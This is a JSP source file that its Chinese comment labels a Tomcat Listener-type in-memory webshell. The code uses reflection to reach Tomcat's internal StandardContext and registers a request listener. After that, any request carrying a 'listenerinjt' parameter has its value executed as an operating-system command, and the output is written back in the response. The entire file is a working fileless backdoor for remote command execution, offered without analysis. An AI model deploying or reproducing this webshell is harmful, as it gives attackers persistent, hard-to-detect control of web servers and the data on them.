<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
基于Tomcat的Listener型内存Webshell
--%>
<%!
    public class ListenerDemo implements ServletRequestListener {
        private HttpServletResponse response;
        public ListenerDemo(HttpServletResponse response) {
            this.response = response;
        }

        @Override
        public void requestDestroyed(ServletRequestEvent sret) {
            System.out.println("requestDestroyed");
        }

        @Override
        public void requestInitialized(ServletRequestEvent sret) {
            try {
                System.out.println("requestInitialized");
                ServletRequest request = sret.getServletRequest();
                ServletOutputStream out = this.response.getOutputStream();
                String cmds = request.getParameter("listenerinjt");
                if (cmds != null) {
                    InputStream in = Runtime.getRuntime().exec(cmds.split(" ")).getInputStream();
                    StringBuilder sb = new StringBuilder();
                    BufferedReader br = new BufferedReader(new InputStreamReader(in));
                    String line = null;
                    while((line = br.readLine()) != null) {
                        sb.append(line).append("\n");
                    }
                    if (sb.length() > 0) {
                        out.print("<pre>");
                        out.write(sb.toString().getBytes());
                        out.print("</pre>");
                        out.flush();
                        out.close();
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
%>
<%
    ServletContext servletContext = request.getServletContext();
    ApplicationContextFacade appCtxFacade = (ApplicationContextFacade)servletContext;
    Field appCtxField = ApplicationContextFacade.class.getDeclaredField("context");
    appCtxField.setAccessible(true);
    ApplicationContext appCtx = (ApplicationContext)appCtxField.get(appCtxFacade);
    Field stdCtxField = ApplicationContext.class.getDeclaredField("context");
    stdCtxField.setAccessible(true);
    StandardContext stdCtx = (StandardContext)stdCtxField.get(appCtx);
    stdCtx.addApplicationEventListener(new ListenerDemo(response));

    out.println("injected!");
%>

